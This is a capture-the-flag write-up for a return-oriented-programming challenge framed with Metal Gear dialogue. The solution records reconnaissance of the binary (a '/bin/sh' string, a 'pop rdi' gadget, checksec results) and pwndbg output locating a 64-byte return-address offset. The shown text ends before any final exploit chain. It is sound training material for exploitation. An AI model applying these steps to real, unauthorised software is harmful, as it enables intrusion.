## Description

https://youtu.be/I5AunfmI8bs?t=1439
There's actually one little thing...
Just spit it out.
I'm used to things going wrong.
It looks like someone's monitoring our transmission.
Who?
I don't have a clue.
All they're doing is watching -- it would creep me out less if they tried to interfere with our communications.
Could it have something to do with that Cypher we saw?
Maybe. I've switched the encryption protocol for our burst transmission for now.
What I want to do is use a different method for sending those photos, just in case.
Instead of using the Codec?
Exactly. There's a workstation in the southeast corner of the block where Metal Gear is housed.
I've made arrangements so that you can send pictures from the machine.

Hint: Use return oriented programming (ROP) and get the gadgets ;) 

## Solution

based on recon, I got these:
- A `/bin/sh` string (`strings`)
- A function named `gadget` (`nm`), with these instructions:
```
push    rbp
mov     rbp, rsp
pop     rdi
retn
```
- Also no canary nor PIE from `checksec`:
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Locating the return pointer address:
- `"A"*64 + cyclic_gen().get(64)` as the payload
- I set a breakpoint at `ret` (main+138)
```
00:0000│ rsp 0x7fffffffe198 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa'
01:0008│     0x7fffffffe1a0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa'
02:0010│     0x7fffffffe1a8 ◂— 'gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa'
03:0018│     0x7fffffffe1b0 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaa'
04:0020│     0x7fffffffe1b8 ◂— 'kaaalaaamaaanaaaoaaapaa'
05:0028│     0x7fffffffe1c0 ◂— 'maaanaaaoaaapaa'
06:0030│     0x7fffffffe1c8 ◂— 0x6161706161616f /* 'oaaapaa' */
07:0038│     0x7fffffffe1d0 ◂— 1
```
The return address can be found using `retaddr` on pwndbg:
```
pwndbg> retaddr
0x7fffffffe198 —▸ 0x7ffff7c2a1ca ◂— mov edi, eax
0x7fffffffe238 —▸ 0x7ffff7c2a28b (__libc_start_main+139) ◂— mov r15, qword ptr [rip + 0x1d8cf6]
0x7fffffffe298 —▸ 0x4010a1 (_start+33) ◂— hlt
```
`RBP` currently is `0x7fffffffe230`, and on my test payload, its value was `0x6161616261616161` ('aaaabaaa').
That's where the offset is, so immediately after 64 bytes of payload.